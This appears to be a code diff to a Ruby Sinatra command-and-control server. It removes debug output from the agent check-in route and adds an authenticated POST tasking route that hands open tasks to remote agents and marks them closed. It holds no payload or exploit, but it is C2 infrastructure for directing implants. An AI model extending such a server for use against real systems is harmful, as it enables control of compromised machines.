@@ -18,9 +18,6 @@ module Sinatra
 					app.post '/c2/checkin/:id' do
 						@agent = Agent.first(id: params[:id])
 						if @agent.nil? or not @agent.authenticate(params[:auth_code])
-							p @agent
-							puts params
-
 							@path = request.path_info
 							jbuilder :error_json
 						else
@@ -29,7 +26,23 @@ module Sinatra
 						end
 					end
 
-					app.get '/c2/tasking/:id' do
+					app.post '/c2/tasking/:id' do
+						@agent = Agent.first(id: params[:id])
+						if @agent.nil? or not @agent.authenticate(params[:auth_code])
+							@path = request.path_info
+							jbuilder :error_json
+						else
+							@tasks = Task.all( open: true, agent: @agent )
+							@tasks.each do |task|
+								task.open = false
+								task.save
+							end
+							jbuilder :tasking_json
+						end
+
+					end
+
+					app.post '/c2/update/:id' do
 
 					end
 
